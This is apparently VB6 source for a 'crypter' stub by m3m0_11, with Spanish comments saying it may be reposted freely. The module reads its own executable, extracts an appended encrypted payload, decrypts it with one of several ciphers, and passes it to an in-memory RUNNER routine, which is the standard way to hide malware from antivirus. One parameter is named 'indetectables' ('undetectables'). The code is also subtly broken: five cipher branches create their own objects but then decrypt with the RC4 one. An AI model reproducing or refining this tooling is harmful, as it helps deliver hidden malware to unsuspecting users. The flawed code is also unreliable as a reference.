Attribute VB_Name = "fds"
'|||||||||||||||||||||||||||||||||||||||||||
'Ejemplo source de crypter by m3m0_11
'Podra ser posteado en cualquier lado siempre conservando el nombre del autor
'|||||||||||||||||||||||||||||||||||||||||||

Option Explicit

Dim puts As String, nm() As String, L As New clsCryptAPI, mxe As String
Dim ge() As Byte
Const sa = "gdsa·$&/ADSFSDHADF)P(ñp8o´&%IP)(&Ksfdahdfs$&ESDFASDHP/(GASDHGAS)%TagYEFFAHADFJDGL /asgsdfSDAa*=)jfgASDGASsjkhf/)O%$&(K~¬€¬kjdhgkghdkdg¬&%(=hadhdfga=$·&gjhsdfjsa/"

Private Sub Main()
Call bn
End Sub

Sub bn()
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #2
puts = Space(LOF(2))
Get #2, , puts
Close #2
Call xd(puts)
Call memo(mxe)
Call nme
End Sub

Public Sub xd(indetectables As String)
nm() = Split(indetectables, sa)
If nm(1) = 1 Then
mxe = L.DecryptString(nm(2), sa)
End If
If nm(1) = 2 Then
Dim za As New clsDES
mxe = za.DecryptString(nm(2), sa)
End If
If nm(1) = 3 Then
Dim wer As New clsRC4
mxe = wer.DecryptString(nm(2), sa)
End If
If nm(1) = 4 Then
Dim blo As New clsBlowFish
mxe = wer.DecryptString(nm(2), sa)
End If
If nm(1) = 5 Then
Dim two As New clsTwoFish
mxe = wer.DecryptString(nm(2), sa)
End If
If nm(1) = 6 Then
Dim tea As New clsTEA
mxe = wer.DecryptString(nm(2), sa)
End If
If nm(1) = 7 Then
Dim gho As New clsGost
mxe = wer.DecryptString(nm(2), sa)
End If
If nm(1) = 8 Then
Dim ski As New clsSkipJack
mxe = wer.DecryptString(nm(2), sa)
End If
End Sub


Sub nme()
Call RUNNER(App.Path & "\" & App.EXEName & ".exe", ge(), Command)
End Sub

Public Sub memo(m3m0_11 As String)
ge() = StrConv(m3m0_11, vbFromUnicode)
End Sub
